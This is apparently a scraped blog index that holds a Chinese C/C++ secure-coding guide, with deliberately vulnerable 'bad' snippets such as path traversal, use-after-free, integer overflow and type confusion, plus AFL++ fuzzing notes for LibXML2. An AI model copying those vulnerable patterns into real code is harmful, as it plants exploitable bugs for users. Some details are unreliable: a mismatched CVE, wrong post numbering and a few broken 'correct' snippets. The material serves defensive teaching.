input) == 0) { return nWeekdays[x]; } } 关联漏洞: 高风险-内存破坏 2.6 【必须】避免函数的声明和实现不同 在头文件、源代码、文档中列举的函数声明应当一致，不应当出现定义内容错位的情况。 错误： foo.h int CalcArea(int width, int height); foo.cc int CalcArea(int height, int width) { // Different from foo.h if (height \u003e real_height) { return 0; } return height * width; } 正确： foo.h int CalcArea(int height, int width); foo.cc int CalcArea (int height, int width) { if (height \u003e real_height) { return 0; } return height * width; } 关联漏洞: 中风险-逻辑问题 2.7 【必须】检查复制粘贴的重复代码（相同代码通常代表错误） 当开发中遇到较长的句子时，如果你选择了复制粘贴语句，请记得检查每一行代码，不要出现上下两句一模一样的情况，这通常代表代码哪里出现了错误： // Bad void Foobar(SomeStruct\u0026 foobase, SomeStruct\u0026 foo1, SomeStruct\u0026 foo2) { foo1.bar = (foo1.bar \u0026 0xffff) | (foobase.base \u0026 0xffff0000); foo1.bar = (foo1.bar \u0026 0xffff) | (foobase.base \u0026 0xffff0000); } 如上例，通常可能是： // Good void Foobar(SomeStruct\u0026 foobase, SomeStruct\u0026 foo1, SomeStruct\u0026 foo2) { foo1.bar = (foo1.bar \u0026 0xffff) | (foobase.base \u0026 0xffff0000); foo2.bar = (foo2.bar \u0026 0xffff) | (foobase.base \u0026 0xffff0000); } 最好是把重复的代码片段提取成函数，如果函数比较短，可以考虑定义为 inline 函数，在减少冗余的同时也能确保不会影响性能。 关联漏洞: 中风险-逻辑问题 2.8 【必须】左右一致的重复判断/永远为真或假的判断（通常代表错误） 这通常是由于自动完成或例如Visual Assistant X之类的补全插件导致的问题。 // Bad if (foo1.bar == foo1.bar) { … } 可能是： // Good if (foo1.bar == foo2.bar) { … } 关联漏洞: 中风险-逻辑问题 2.9 【必须】函数每个分支都应有返回值 函数的每个分支都应该有返回值，否则如果函数走到无返回值的分支，其结果是未知的。 // Bad int Foo(int bar) { if (bar \u003e 100) { return 10; } else if (bar \u003e 10) { return 1; } } 上述例子当bar\u003c10时，其结果是未知的值。 // Good int Foo(int bar) { if (bar \u003e 100) { return 10; } else if (bar \u003e 10) { return 1; } return 0; } 开启适当级别的警告（GCC 中为 -Wreturn-type ","date":"2021-01-04","objectID":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/:1:2","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/"},{"categories":["Development"],"content":"3 多线程 3.1 【必须】变量应确保线程安全性 当一个变量可能被多个线程使用时，应当使用原子操作或加锁操作。 // Bad char g_somechar; void foo_thread1() { g_somechar += 3; } void foo_thread2() { g_somechar += 1; } 对于可以使用原子操作的，应当使用一些可以确保内存安全的操作，如： // Good volatile char g_somechar; void foo_thread1() { __sync_fetch_and_add(\u0026g_somechar, 3); } void foo_thread2() { __sync_fetch_and_add(\u0026g_somechar, 1); } 对于 C 代码，C11 后推荐使用 atomic 标准库。 对于 C++代码，C++11 后，推荐使用 std::atomic。 关联漏洞: 高风险-内存破坏 中风险-逻辑问题 3.2 【必须】注意signal handler导致的条件竞争 竞争条件经常出现在信号处理程序中，因为信号处理程序支持异步操作。攻击者能够利用信号处理程序争用条件导致软件状态损坏，从而可能导致拒绝服务甚至代码执行。 当信号处理程序中发生不可重入函数或状态敏感操作时，就会出现这些问题。因为信号处理程序中随时可以被调用。比如，当在信号处理程序中调用free时，通常会出现另一个信号争用条件，从而导致双重释放。即使给定指针在释放后设置为NULL，在释放内存和将指针设置为NULL之间仍然存在竞争的可能。 为多个信号设置了相同的信号处理程序，这尤其有问题——因为这意味着信号处理程序本身可能会重新进入。例如，malloc()和free()是不可重入的，因为它们可能使用全局或静态数据结构来管理内存，并且它们被syslog()等看似无害的函数间接使用；这些函数可能会导致内存损坏和代码执行。 // Bad char *log_message; void Handler(int signum) { syslog(LOG_NOTICE, \"%s\\n\", log_m_essage); free(log_message); sleep(10); exit(0); } int main (int argc, char* argv[]) { log_message = strdup(argv[1]); signal(SIGHUP, Handler); signal(SIGTERM, Handler); sleep(10); } 可以借由下列操作规避问题： 避免在多个处理函数中共享某些变量。 在信号处理程序中使用同步操作。 屏蔽不相关的信号，从而提供原子性。 避免在信号处理函数中调用不满足异步信号安全的函数。 关联漏洞: 高风险-内存破坏 中风险-逻辑问题 3.3 【建议】注意Time-of-check Time-of-use (TOCTOU) 条件竞争 TOCTOU： 软件在使用某个资源之前检查该资源的状态，但是该资源的状态可以在检查和使用之间更改，从而使检查结果无效。当资源处于这种意外状态时，这可能会导致软件执行错误操作。 当攻击者可以影响检查和使用之间的资源状态时，此问题可能与安全相关。这可能发生在共享资源(如文件、内存，甚至多线程程序中的变量)上。在编程时需要注意避免出现TOCTOU问题。 例如，下面的例子中，该文件可能已经在检查和lstat之间进行了更新，特别是因为printf有延迟。 struct stat *st; lstat(\"...\", st); printf(\"foo\"); if (st-\u003est_mtimespec == ...) { printf(\"Now updating things\\n\"); UpdateThings(); } TOCTOU难以修复，但是有以下缓解方案： 限制对来自多个进程的文件的交叉操作。 如果必须在多个进程或线程之间共享对资源的访问，那么请尝试限制”检查“（CHECK）和”使用“（USE）资源之间的时间量，使他们相距尽量不要太远。这不会从根本上解决问题，但可能会使攻击更难成功。 在Use调用之后重新检查资源，以验证是否正确执行了操作。 确保一些环境锁定机制能够被用来有效保护资源。但要确保锁定是检查之前进行的，而不是在检查之后进行的，以便检查时的资源与使用时的资源相同。 关联漏洞: 高风险-内存破坏 中风险-逻辑问题 ","date":"2021-01-04","objectID":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/:1:3","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/"},{"categories":["Development"],"content":"4 加密解密 4.1 【必须】不得明文存储用户密码等敏感数据 用户密码应该使用 Argon2, scrypt, bcrypt, pbkdf2 等算法做哈希之后再存入存储系统, https://password-hashing.net/ https://libsodium.gitbook.io/doc/password_hashing/default_phf#example-2-password-storage 用户敏感数据，应该做到传输过程中加密，存储状态下加密 传输过程中加密，可以使用 HTTPS 等认证加密通信协议 存储状态下加密，可以使用 SQLCipher 等类似方案。 4.2 【必须】内存中的用户密码等敏感数据应该安全抹除 例如用户密码等，即使是临时使用，也应在使用完成后应当将内容彻底清空。 错误： #include \u003copenssl/crypto.h\u003e #include \u003cunistd.h\u003e { ... string user_password(100, '\\0'); snprintf(\u0026user_password, \"password: %s\", user_password.size(), password_from_input); ... } 正确： { ... string user_password(100, '\\0'); snprintf(\u0026user_password, \"password: %s\", user_password.size(), password_from_input); ... OPENSSL_cleanse(\u0026user_password[0], user_password.size()); } 关联漏洞: 高风险-敏感信息泄露 4.3 【必须】rand() 类函数应正确初始化 rand类函数的随机性并不高。而且在使用前需要使用srand()来初始化。未初始化的随机数可能导致某些内容可预测。 // Bad int main() { int foo = rand(); return 0; } 上述代码执行完成后，foo的值是固定的。它等效于 srand(1); rand();。 // Good int main() { srand(time(0)); int foo = rand(); return 0; } 关联漏洞: 高风险-逻辑漏洞 4.4 【必须】在需要高强度安全加密时不应使用弱PRNG函数 在需要生成 AES/SM1/HMAC 等算法的密钥/IV/Nonce， RSA/ECDSA/ECDH 等算法的私钥，这类需要高安全性的业务场景，必须使用密码学安全的随机数生成器 (Cryptographically Secure PseudoRandom Number Generator (CSPRNG) ), 不得使用 rand() 等无密码学安全性保证的普通随机数生成器。 推荐使用的 CSPRNG 有： OpenSSL 中的 RAND_bytes() 函数, https://www.openssl.org/docs/man1.1.1/man3/RAND_bytes.html libsodium 中的 randombytes_buf() 函数 Linux kernel 的 getrandom() 系统调用, https://man7.org/linux/man-pages/man2/getrandom.2.html . 或者读 /dev/urandom 文件, 或者 /dev/random 文件。 Apple IOS 的 SecRandomCopyBytes(), https://developer.apple.com/documentation/security/1399291-secrandomcopybytes Windows 下的 BCryptGenRandom(), CryptGenRandom(), RtlGenRandom() #include \u003copenssl/aes.h\u003e #include \u003copenssl/crypto.h\u003e #include \u003copenssl/rand.h\u003e #include \u003cunistd.h\u003e { unsigned char key[16]; if (1 != RAND_bytes(\u0026key[0], sizeof(key))) { //... 错误处理 return -1; } AES_KEY aes_key; if (0 != AES_set_encrypt_key(\u0026key[0], sizeof(key) * 8, \u0026aes_key)) { // ... 错误处理 return -1; } ... OPENSSL_cleanse(\u0026key[0], sizeof(key)); } rand()类函数的随机性并不高。敏感操作时，如设计加密算法时，不得使用rand()或者类似的简单线性同余伪随机数生成器来作为随机数发生器。符合该定义的比特序列的特点是，序列中“1”的数量约等于“0”的数量；同理，“01”、“00”、“10”、“11”的数量大致相同，以此类推。 例如 C 标准库中的 rand() 的实现只是简单的线性同余算法，生成的伪随机数具有较强的可预测性。 当需要实现高强度加密，例如涉及通信安全时，不应当使用 rand() 作为随机数发生器。 实际应用中，C++11 标准提供的random_device保证加密的安全性和随机性 但是 C++ 标准并不保证这一点。跨平台的代码可以考虑用 OpenSSL 等保证密码学安全的库里的随机数发生器。 关联漏洞: 高风险-敏感数据泄露 4.5 【必须】自己实现的rand范围不应过小 如果在弱安全场景相关的算法中自己实现了PRNG，请确保rand出来的随机数不会很小或可预测。 // Bad int32_t val = ((state[0] * 1103515245U) + 12345U) \u0026 999999; 上述例子可能想生成0~999999共100万种可能的随机数，但是999999的二进制是11110100001000111111，与\u0026运算后，0位一直是0，所以生成出的范围明显会小于100万种。 // Good int32_t val = ((state[0] * 1103515245U) + 12345U) % 1000000; // Good int32_t val = ((state[0] * 1103515245U) + 12345U) \u0026 0x7fffffff; 关联漏洞: 高风险-逻辑漏洞 ","date":"2021-01-04","objectID":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/:1:4","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/"},{"categories":["Development"],"content":"5 文件操作 5.1 【必须】避免路径穿越问题 在进行文件操作时，需要判断外部传入的文件名是否合法，如果文件名中包含 ../ 等特殊字符，则会造成路径穿越，导致任意文件的读写。 错误： void Foo() { char file_path[PATH_MAX] = \"/home/user/code/\"; // 如果传入的文件名包含../可导致路径穿越 // 例如\"../file.txt\"，则可以读取到上层目录的file.txt文件 char name[20] = \"../file.txt\"; memcpy(file_path + strlen(file_path), name, sizeof(name)); int fd = open(file_path, O_RDONLY); if (fd != -1) { char data[100] = {0}; int num = 0; memset(data, 0, sizeof(data)); num = read(fd, data, sizeof(data)); if (num \u003e 0) { write(STDOUT_FILENO, data, num); } close(fd); } } 正确： void Foo() { char file_path[PATH_MAX] = \"/home/user/code/\"; char name[20] = \"../file.txt\"; // 判断传入的文件名是否非法，例如\"../file.txt\"中包含非法字符../，直接返回 if (strstr(name, \"..\") != NULL){ // 包含非法字符 return; } memcpy(file_path + strlen(file_path), name, sizeof(name)); int fd = open(file_path, O_RDONLY); if (fd != -1) { char data[100] = {0}; int num = 0; memset(data, 0, sizeof(data)); num = read(fd, data, sizeof(data)); if (num \u003e 0) { write(STDOUT_FILENO, data, num); } close(fd); } } 关联漏洞: 高风险-逻辑漏洞 5.2 【必须】避免相对路径导致的安全问题（DLL、EXE劫持等问题） 在程序中，使用相对路径可能导致一些安全风险，例如DLL、EXE劫持等问题。 例如以下代码，可能存在劫持问题： int Foo() { // 传入的是dll文件名，如果当前目录下被写入了恶意的同名dll，则可能导致dll劫持 HINSTANCE hinst = ::LoadLibrary(\"dll_nolib.dll\"); if (hinst != NULL) { cout\u003c\u003c\"dll loaded!\" \u003c\u003c endl; } return 0; } 针对DLL劫持的安全编码的规范： 1）调用LoadLibrary，LoadLibraryEx，CreateProcess，ShellExecute等进行模块加载的函数时，指明模块的完整（全）路径，禁止使用相对路径，这样就可避免从其它目录加载DLL。 2）在应用程序的开头调用SetDllDirectory(TEXT(\"\")); 从而将当前目录从DLL的搜索列表中删除。结合SetDefaultDllDirectories，AddDllDirectory，RemoveDllDirectory这几个API配合使用，可以有效的规避DLL劫持问题。这些API只能在打了KB2533623补丁的Windows7，2008上使用。 关联漏洞: 中风险-逻辑漏洞 5.3 【必须】文件权限控制 在创建文件时，需要根据文件的敏感级别设置不同的访问权限，以防止敏感数据被其他恶意程序读取或写入。 错误： int Foo() { // 不要设置为777权限，以防止被其他恶意程序操作 if (creat(\"file.txt\", 0777) \u003c 0) { printf(\"文件创建失败！\\n\"); } else { printf(\"文件创建成功！\\n\"); } return 0; } 关联漏洞: 中风险-逻辑漏洞 ","date":"2021-01-04","objectID":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/:1:5","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/"},{"categories":["Development"],"content":"6 内存操作 6.1 【必须】防止各种越界写（向前/向后） 错误1： int a[5]; a[5] = 0; 错误2： int a[5]; int b = user_controlled_value; a[b] = 3; 关联漏洞: 高风险-内存破坏 6.2 【必须】防止任意地址写 任意地址写会导致严重的安全隐患，可能导致代码执行。因此，在编码时必须校验写入的地址。 错误： void Write(MyStruct dst_struct) { char payload[10] = { 0 }; memcpy(dst_struct.buf, payload, sizeof(payload)); } int main() { MyStruct dst_stuct; dst_stuct.buf = (char*)user_controlled_value; Write(dst_stuct); return 0; } 关联漏洞: 高风险-内存破坏 ","date":"2021-01-04","objectID":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/:1:6","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/"},{"categories":["Development"],"content":"7 数字操作 7.1 【必须】防止整数溢出 在计算时需要考虑整数溢出的可能，尤其在进行内存操作时，需要对分配、拷贝等大小进行合法校验，防止整数溢出导致的漏洞。 错误（该例子在计算时产生整数溢出） const kMicLen = 4; // 整数溢出 void Foo() { int len = 1; char payload[10] = { 0 }; char dst[10] = { 0 }; // Bad, 由于len小于4字节，导致计算拷贝长度时，整数溢出 // len - MIC_LEN == 0xfffffffd memcpy(dst, payload, len - kMicLen); } 正确例子 void Foo() { int len = 1; char payload[10] = { 0 }; char dst[10] = { 0 }; int size = len - kMicLen; // 拷贝前对长度进行判断 if (size \u003e 0 \u0026\u0026 size \u003c 10) { memcpy(dst, payload, size); printf(\"memcpy good\\n\"); } } 关联漏洞: 高风险-内存破坏 7.2 【必须】防止Off-By-One 在进行计算或者操作时，如果使用的最大值或最小值不正确，使得该值比正确值多1或少1，可能导致安全风险。 错误： char firstname[20]; char lastname[20]; char fullname[40]; fullname[0] = '\\0'; strncat(fullname, firstname, 20); // 第二次调用strncat()可能会追加另外20个字符。如果这20个字符没有终止空字符，则存在安全问题 strncat(fullname, lastname, 20); 正确： char firstname[20]; char lastname[20]; char fullname[40]; fullname[0] = '\\0'; // 当使用像strncat()函数时，必须在缓冲区的末尾为终止空字符留下一个空字节，避免off-by-one strncat(fullname, firstname, sizeof(fullname) - strlen(fullname) - 1); strncat(fullname, lastname, sizeof(fullname) - strlen(fullname) - 1); 对于 C++ 代码，再次强烈建议使用 string、vector 等组件代替原始指针和数组操作。 关联漏洞: 高风险-内存破坏 7.3 【必须】避免大小端错误 在一些涉及大小端数据处理的场景，需要进行大小端判断，例如从大段设备取出的值，要以大段进行处理，避免端序错误使用。 关联漏洞: 中风险-逻辑漏洞 7.4 【必须】检查除以零异常 在进行除法运算时，需要判断被除数是否为零，以防导致程序不符合预期或者崩溃。 错误： double divide(double x, double y) { return x / y; } int divide(int x, int y) { return x / y; } 正确： double divide(double x, double y) { if (y == 0) { throw DivideByZero; } return x / y; } 关联漏洞: 低风险-拒绝服务 7.5 【必须】防止数字类型的错误强转 在有符号和无符号数字参与的运算中，需要注意类型强转可能导致的逻辑错误，建议指定参与计算时数字的类型或者统一类型参与计算。 错误例子 int Foo() { int len = 1; unsigned int size = 9; // 1 \u003c 9 - 10 ? 由于运算中无符号和有符号混用，导致计算结果以无符号计算 if (len \u003c size - 10) { printf(\"Bad\\n\"); } else { printf(\"Good\\n\"); } } 正确例子 void Foo() { // 统一两者计算类型为有符号 int len = 1; int size = 9; if (len \u003c size - 10) { printf(\"Bad\\n\"); } else { printf(\"Good\\n\"); } } 关联漏洞: 高风险-内存破坏 中风险-逻辑漏洞 7.6 【必须】比较数据大小时加上最小/最大值的校验 在进行数据大小比较时，要合理地校验数据的区间范围，建议根据数字类型，对其进行最大和最小值的判断，以防止非预期错误。 错误： void Foo(int index) { int a[30] = {0}; // 此处index是int型，只考虑了index小于数组大小，但是并未判断是否大于0 if (index \u003c 30) { // 如果index为负数，则越界 a[index] = 1; } } 正确： void Foo(int index) { int a[30] = {0}; // 判断index的最大最小值 if (index \u003e=0 \u0026\u0026 index \u003c 30) { a[index] = 1; } } 关联漏洞: 高风险-内存破坏 ","date":"2021-01-04","objectID":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/:1:7","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/"},{"categories":["Development"],"content":"8 指针操作 8.1 【建议】检查在pointer上使用sizeof 除了测试当前指针长度，否则一般不会在pointer上使用sizeof。 正确： size_t pointer_length = sizeof(void*); 可能错误： size_t structure_length = sizeof(Foo*); 可能是： size_t structure_length = sizeof(Foo); 关联漏洞: 中风险-逻辑漏洞 8.2 【必须】检查直接将数组和0比较的代码 错误： int a[3]; ...; if (a \u003e 0) ...; 该判断永远为真，等价于: int a[3]; ...; if (\u0026a[0]) ...; 可能是： int a[3]; ...; if(a[0] \u003e 0) ...; 开启足够的编译器警告（GCC 中为 -Waddress，并已包含在 -Wall 中），并设置为错误，可以在编译期间发现该问题。 关联漏洞: 中风险-逻辑漏洞 8.3 【必须】不应当向指针赋予写死的地址 特殊情况需要特殊对待（比如开发硬件固件时可能需要写死） 但是如果是系统驱动开发之类的，写死可能会导致后续的问题。 关联漏洞: 高风险-内存破坏 8.4 【必须】检查空指针 错误： *foo = 100; if (!foo) { ERROR(\"foobar\"); } 正确： if (!foo) { ERROR(\"foobar\"); } *foo = 100; 错误： void Foo(char* bar) { *bar = '\\0'; } 正确： void Foo(char* bar) { if(bar) *bar = '\\0'; else ...; } 关联漏洞: 低风险-拒绝服务 8.5 【必须】释放完后置空指针 在对指针进行释放后，需要将该指针设置为NULL，以防止后续free指针的误用，导致UAF等其他内存破坏问题。尤其是在结构体、类里面存储的原始指针。 错误： void foo() { char* p = (char*)malloc(100); memcpy(p, \"hello\", 6); // 此时p所指向的内存已被释放，但是p所指的地址仍然不变 printf(\"%s\\n\", p); free(p); // 未设置为NULL，可能导致UAF等内存错误 if (p != NULL) { // 没有起到防错作用 printf(\"%s\\n\", p); // 错误使用已经释放的内存 } } 正确： void foo() { char* p = (char*)malloc(100); memcpy(p, \"hello\", 6); // 此时p所指向的内存已被释放，但是p所指的地址仍然不变 printf(\"%s\\n\", p); free(p); //释放后将指针赋值为空 p = NULL; if (p != NULL) { // 没有起到防错作用 printf(\"%s\\n\", p); // 错误使用已经释放的内存 } } 对于 C++ 代码，使用 string、vector、智能指针等代替原始内存管理机制，可以大量减少这类错误。 关联漏洞: 高风险-内存破坏 8.6 【必须】防止错误的类型转换（type confusion） 在对指针、对象或变量进行操作时，需要能够正确判断所操作对象的原始类型。如果使用了与原始类型不兼容的类型进行访问，则存在安全隐患。 错误： const int NAME_TYPE = 1; const int ID_TYPE = 2; // 该类型根据 msg_type 进行区分，如果在对MessageBuffer进行操作时没有判断目标对象，则存在类型混淆 struct MessageBuffer { int msg_type; union { const char *name; int name_id; }; }; void Foo() { struct MessageBuffer buf; const char* default_message = \"Hello World\"; // 设置该消息类型为 NAME_TYPE，因此buf预期的类型为 msg_type + name buf.msg_type = NAME_TYPE; buf.name = default_message; printf(\"Pointer of buf.name is %p\\n\", buf.name); // 没有判断目标消息类型是否为ID_TYPE，直接修改nameID，导致类型混淆 buf.name_id = user_controlled_value; if (buf.msg_type == NAME_TYPE) { printf(\"Pointer of buf.name is now %p\\n\", buf.name); // 以NAME_TYPE作为类型操作，可能导致非法内存读写 printf(\"Message: %s\\n\", buf.name); } else { printf(\"Message: Use ID %d\\n\", buf.name_id); } } 正确（判断操作的目标是否是预期类型）： void Foo() { struct MessageBuffer buf; const char* default_message = \"Hello World\"; // 设置该消息类型为 NAME_TYPE，因此buf预期的类型为 msg_type + name buf.msg_type = NAME_TYPE; buf.name = default_msessage; printf(\"Pointer of buf.name is %p\\n\", buf.name); // 判断目标消息类型是否为 ID_TYPE，不是预期类型则做对应操作 if (buf.msg_type == ID_TYPE) buf.name_id = user_controlled_value; if (buf.msg_type == NAME_TYPE) { printf(\"Pointer of buf.name is now %p\\n\", buf.name); printf(\"Message: %s\\n\", buf.name); } else { printf(\"Message: Use ID %d\\n\", buf.name_id); } } 关联漏洞: 高风险-内存破坏 8.7 【必须】智能指针使用安全 在使用智能指针时，防止其和原始指针的混用，否则可能导致对象生命周期问题，例如 UAF 等安全风险。 错误例子： class Foo { public: explicit Foo(int num) { data_ = num; }; void Function() { printf(\"Obj is %p, data = %d\\n\", this, data_); }; private: int data_; }; std::unique_ptr\u003cFoo\u003e fool_u_ptr = nullptr; Foo* pfool_raw_ptr = nullptr; void Risk() { fool_u_ptr = make_unique\u003cFoo\u003e(1); // 从独占智能指针中获取原始指针,\u003cFoo\u003e(1) pfool_raw_ptr = fool_u_ptr.get(); // 调用\u003cFoo\u003e(1)的函数 pfool_raw_ptr-\u003eFunction(); // 独占智能指针重新赋值后会释放内存 fool_u_ptr = make_unique\u003cFoo\u003e(2); // 通过原始指针操作会导致UAF，pfool_raw_ptr指向的对象已经释放 pfool_raw_ptr-\u003eFunction(); } // 输出： // Obj is 0000027943087B80, data = 1 // Obj is 0000027943087B80, data = -572662307 正确，通过智能指针操作: void Safe() { fool_u_ptr = make_unique\u003cFoo\u003e(1); // 调用\u003cFoo\u003e(1)的函数 fool_u_ptr-\u003efunction(); fool_u_ptr = make_unique\u003cFoo\u003e(2); // 调用\u003cFoo\u003e(2)的函数 fool_u_ptr-\u003efunction(); } // 输出： // Obj is 000002C7BB550830, data = 1 // Obj is 000002C7BB557AF0, data = 2 关联漏洞: 高风险-内存破坏 ","date":"2021-01-04","objectID":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/:1:8","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/"},{"categories":["Development"],"content":"参考链接 https://www.w3cschool.cn/secguide/secguide-ysdn3fk5.html ","date":"2021-01-04","objectID":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/:2:0","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/"},{"categories":["Fuzz"],"content":"Fuzzing 101 系列 note 5","date":"2020-12-18","objectID":"/fuzzing101-5/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/fuzzing101-5/"},{"categories":["Fuzz"],"content":"本文是Fuzzing101系列第四篇，fuzz的对象为 LibXML2 。 ","date":"2020-12-18","objectID":"/fuzzing101-5/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/fuzzing101-5/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics LibXML2 CVE-2017-9048 3hous measure the code coverage data CVE-2017-13028: Out-of-bounds Read vulneratibily. ","date":"2020-12-18","objectID":"/fuzzing101-5/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/fuzzing101-5/"},{"categories":["Fuzz"],"content":"2. Learning Target 在fuzzer中使用自定义词典 使用多个内核并行进行fuzz ","date":"2020-12-18","objectID":"/fuzzing101-5/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/fuzzing101-5/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2020-12-18","objectID":"/fuzzing101-5/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/fuzzing101-5/"},{"categories":["Fuzz"],"content":"1. Workflow 找到一个使用LibXML2共享库的应用程序 复制SampleInput.xml文件到AFL的input目录 创建fuzzing XML的常规目录 开始fuzz，直到出现crash 使用造成crash的poc重现crash 修复漏洞 ","date":"2020-12-18","objectID":"/fuzzing101-5/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/fuzzing101-5/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target 首先创建待fuzz的LibXML2环境，进行编译待用： cd $HOME mkdir Fuzzing_libxml2 \u0026\u0026 cd Fuzzing_libxml2 # download and uncompress the target wget http://xmlsoft.org/download/libxml2-2.9.4.tar.gz tar xvf libxml2-2.9.4.tar.gz \u0026\u0026 cd libxml2-2.9.4/ # build and install libtiff sudo apt-get install python-dev CC=afl-clang-lto CXX=afl-clang-lto++ CFLAGS=\"-fsanitize=address\" CXXFLAGS=\"-fsanitize=address\" LDFLAGS=\"-fsanitize=address\" ./configure --prefix=\"$HOME/Fuzzing_libxml2/libxml2-2.9.4/install\" --disable-shared --without-debug --without-ftp --without-http --without-legacy --without-python LIBS='-ldl' make -j$(nproc) make install # test the target program ./xmllint --memory ./test/wml.xml 以上安装不报错的话，可以正常调用LibXML库 ： 注意一下上面的warning，有提示如果出现AFL++崩溃的情况，可以考虑讲AFL_MAP_SIZE的大小设置为146056. 2. Seed corpus creation 这里直接使用SampleInput.xml做为XML的样例： \u003c!DOCTYPE a []\u003e 3. Custom dictionary 这里直接使用AFL++提供的XML的dict： mkdir dictionaries \u0026\u0026 cd dictionaries wget https://github.com/AFLplusplus/AFLplusplus/blob/stable/dictionaries/xml.dict cd .. 4. Fuzzing 执行 afl-fuzz ，采用并行方式进行fuzz: afl-fuzz -m none -i ./afl_in -o afl_out -s 123 -x ./dictionaries/xml.dict -M master -- ./xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@ afl-fuzz -m none -i ./afl_in -o afl_out -s 234 -x ./dictionaries/xml.dict -S slave1 -- ./xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@ ","date":"2020-12-18","objectID":"/fuzzing101-5/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/fuzzing101-5/"},{"categories":["Fuzz"],"content":"3. Crashes 最终没有跑出来crash（肯定是哪里出了问题）： ","date":"2020-12-18","objectID":"/fuzzing101-5/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/fuzzing101-5/"},{"categories":["Fuzz"],"content":"4. Triage 这里直接使用的是教程里的： ./xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude './afl_out/default/crashes/id:000000,sig:06,src:003963,time:12456489,op:havoc,rep:4' ","date":"2020-12-18","objectID":"/fuzzing101-5/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/fuzzing101-5/"},{"categories":["Fuzz"],"content":"5. Fix 官方的修复地址： https://github.com/GNOME/libxml2/commit/932cc9896ab41475d4aa429c27d9afd175959d74 后续将对该漏洞进行深入分析和补丁分析，待完善。 ","date":"2020-12-18","objectID":"/fuzzing101-5/:5:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/fuzzing101-5/"},{"categories":["Fuzz"],"content":"Fuzzing 101 系列 note 4","date":"2020-12-08","objectID":"/fuzzing101-4/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/fuzzing101-4/"},{"categories":["Fuzz"],"content":"本文是Fuzzing101系列第四篇，fuzz的对象为 LibTIFF 。 ","date":"2020-12-08","objectID":"/fuzzing101-4/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/fuzzing101-4/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics LibTIFF CVE-2016-9297 3hous measure the code coverage data CVE-2017-13028: Out-of-bounds Read vulneratibily. ","date":"2020-12-08","objectID":"/fuzzing101-4/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/fuzzing101-4/"},{"categories":["Fuzz"],"content":"2. Learning Target 什么是 Code Coverage，代码覆盖率 使用 LCOV 对代码覆盖率进行测量 如何通过代码覆盖率的优化提升Fuzzing性能 